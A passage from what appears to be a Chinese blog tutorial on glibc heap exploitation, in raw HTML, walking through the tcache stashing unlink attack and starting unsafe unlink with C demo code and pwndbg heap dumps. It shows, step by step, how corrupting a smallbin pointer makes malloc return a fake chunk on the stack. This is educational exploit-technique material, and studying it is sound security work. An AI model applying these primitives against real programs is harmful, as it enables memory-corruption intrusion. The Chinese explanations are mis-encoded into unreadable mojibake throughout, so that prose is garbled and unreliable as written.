class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"> â–º <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">42</span> <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line">   <span class="number">43</span></span><br><span class="line">   <span class="number">44</span> assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">   <span class="number">45</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">46</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp     <span class="number">0x7fff96c64620</span> â€”â–¸ <span class="number">0x7f5ea82fbfc8</span> (__exit_funcs_lock) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚ rax r8  <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚         <span class="number">0x7fff96c64630</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚         <span class="number">0x7fff96c64638</span> â€”â–¸ <span class="number">0x55ce97ce6330</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚         <span class="number">0x7fff96c64640</span> â€”â–¸ <span class="number">0x7fff96c64628</span> â€”â–¸ <span class="number">0x55ce96f65410</span> (__libc_csu_init) â—‚â€” endbr64</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚         <span class="number">0x7fff96c64648</span> â—‚â€” <span class="number">0x6690dce44b0a5500</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚ rbp     <span class="number">0x7fff96c64650</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x7fff96c64658</span> â€”â–¸ <span class="number">0x7f5ea81320b3</span> (__libc_start_main+<span class="number">243</span>) â—‚â€” mov    edi, eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>ce96f653a3 main+<span class="number">410</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>5ea81320b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">6</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x7fff96c64628</span></span><br></pre></td></tr></table></figure><h3 id="10-tcache-stashing-unlink-attack"><a href="#10-tcache-stashing-unlink-attack" class="headerlink" title="10. tcache_stashing_unlink_attack"></a>10. tcache_stashing_unlink_attack</h3><p>tcache ä¸Šçš„ stashing unlink attack</p><p>å½“ä½ èƒ½å¤Ÿè¦†ç›–victor-&gt;bkæŒ‡é’ˆæ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæŠ€æœ¯ã€‚æ­¤å¤–ï¼Œè‡³å°‘éœ€è¦ç”¨callocåˆ†é…ä¸€ä¸ªchunkã€‚</p><p>åœ¨glibcä¸­ï¼Œå°†smallbinæ”¾å…¥tcacheçš„æœºåˆ¶ç»™äº†æˆ‘ä»¬å‘åŠ¨æ”»å‡»çš„æœºä¼š. è¿™ç§æŠ€æœ¯å…è®¸æˆ‘ä»¬æŠŠlibc addrå†™åˆ°ä»»ä½•æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ï¼Œå¹¶åœ¨ä»»ä½•éœ€è¦çš„åœ°æ–¹åˆ›å»ºä¸€ä¸ªå‡çš„chunkã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†åœ¨å †æ ˆä¸Šåˆ›å»ºä¸€ä¸ªå‡çš„chunk.</p><p>ä¾‹å¦‚æ­¤æ—¶æˆ‘ä»¬åœ¨æ ˆä¸Šä¼ªé€ ä¸€ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">22</span>     stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffea4571c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffea4571d0</span></span><br><span class="line"><span class="number">0x7fffea4571e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea4571f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457200</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457210</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457220</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457230</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457240</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffea457250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè®©æˆ‘ä»¬å‘ fake_chunk-&gt;bk å†™ä¸€ä¸ªå¯å†™çš„åœ°å€ï¼Œä»¥ç»•è¿‡ glibc ä¸­çš„ bck-&gt;fd = binã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©stack_var[2]çš„åœ°å€ä½œä¸ºfake bkã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°*(fake_chunk-&gt;bk + 0x10)ï¼Œä¹Ÿå°±æ˜¯stack_var[4]åœ¨æ”»å‡»åå°†æˆä¸ºlibc addr</p><p>malloc 9 ä¸ªchunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">29</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line"><span class="number">30</span>         chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">31</span>     &#125;</span><br></pre></td></tr></table></figure><p>free 7 ä¸ªchunkï¼Œå¡«æ»¡ tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span>     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">  <span class="number">37</span>         <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">  <span class="number">38</span>     &#125;</span><br><span class="line">  <span class="number">39</span></span><br><span class="line">â–º <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">41</span></span><br><span class="line">  <span class="number">42</span>     <span class="comment">//last tcache bin</span></span><br><span class="line">  <span class="number">43</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ï¼Œ tcache bin çš„æœ€åä¸€ä¸ªbinæ˜¯  chunk_lis[1]</p><p>ç„¶ååœ¨ unsort bin é‡Œæ”¾å…¥ä¸¤ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">44</span>     <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"> â–º <span class="number">45</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">   <span class="number">46</span>     <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">47</span></span><br><span class="line">     â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x55a4674bc340</span> â€”â–¸ <span class="number">0x55a4674bc7a0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x7fd3f030cbe0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x55a4674bc3d0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ†é…ä¸€ä¸ªå¤§äº 0x90 çš„chunk ï¼Œè¿™ä¸ªæ—¶å€™ chunk0 å’Œ chunk2 ä¼šè¢«æ”¾å…¥ smallbin é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â–º <span class="number">49</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">  <span class="number">50</span></span><br><span class="line">  <span class="number">51</span>     <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘å† malloc ä¸¤ä¸ª chunk ï¼Œä»tcache bin å–å‡ºä¸¤ä¸ª chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) â—‚â€” <span class="number">0x55a4674bc3d0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ­¤æ—¶ï¼Œæˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªæ¼æ´èƒ½ä¿®æ”¹ chunklis[2]çš„ bck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">61</span>     <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">  <span class="number">62</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">â–º <span class="number">63</span>     chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">64</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">  <span class="number">65</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ bins å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">5</span>]: <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) â—‚â€” <span class="number">0x55a4674bc3d0</span></span><br><span class="line">BK: <span class="number">0x55a4674bc290</span> â€”â–¸ <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x7fffea4571c0</span> â€”â–¸ <span class="number">0x7fffea4571d0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬ calloc ä¸€ä¸ªæ–° chunk ï¼Œæ­¤æ—¶å°† chunk[0] (calloc ä¸ä¼šä» tcache å–)</p><p>smallbin çš„chunk ä¼šè¢«é‡æ–°å¡«å……åˆ° tache biné‡Œï¼Œç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡ tcache æ²¡æœ‰ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå†å°† fake chunk å–å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0xa0</span> [  <span class="number">7</span>]: <span class="number">0x7fffea4571d0</span> â€”â–¸ <span class="number">0x55a4674bc3e0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â€”â–¸ <span class="number">0x55a4674bc520</span> â€”â–¸ <span class="number">0x55a4674bc480</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55a4674bc3d0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x7fffea4571d0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In file: /pwn/tcache_stashing_unlink_attack.c</span><br><span class="line">   <span class="number">71</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">   <span class="number">74</span>     target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> â–º <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">   <span class="number">77</span></span><br><span class="line">   <span class="number">78</span>     assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">   <span class="number">79</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="number">80</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp     <span class="number">0x7fffea4571b0</span> â—‚â€” <span class="number">0x900000009</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚         <span class="number">0x7fffea4571b8</span> â€”â–¸ <span class="number">0x7fffea4571d0</span> â€”â–¸ <span class="number">0x55a4674bc3e0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â—‚â€” ...</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚         <span class="number">0x7fffea4571c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚ rax r8  <span class="number">0x7fffea4571d0</span> â€”â–¸ <span class="number">0x55a4674bc3e0</span> â€”â–¸ <span class="number">0x55a4674bc700</span> â€”â–¸ <span class="number">0x55a4674bc660</span> â€”â–¸ <span class="number">0x55a4674bc5c0</span> â—‚â€” ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚         <span class="number">0x7fffea4571d8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚         <span class="number">0x7fffea4571e0</span> â€”â–¸ <span class="number">0x7fd3f030cc70</span> (main_arena+<span class="number">240</span>) â€”â–¸ <span class="number">0x7fd3f030cc60</span> (main_arena+<span class="number">224</span>) â€”â–¸ <span class="number">0x7fd3f030cc50</span> (main_arena+<span class="number">208</span>) â€”â–¸ <span class="number">0x7fd3f030cc40</span> (main_arena+<span class="number">192</span>) â—‚â€” ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x7fffea4571e8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55</span>a466c59494 main+<span class="number">619</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>d3f01480b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p target</span><br><span class="line">$<span class="number">15</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) <span class="number">0x7fffea4571d0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h3 id="11-unsafe-unlink"><a href="#11-unsafe-unlink" class="headerlink" title="11. unsafe_unlink"></a>11. unsafe_unlink</h3><p>åˆ†é…ä¸¤ä¸ªè¶³å¤Ÿå¤§çš„ chunk ï¼Œfree åä¸ä¼šè¢«æ”¾å…¥ fastbin å’Œtcache ï¼ˆ0x420)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 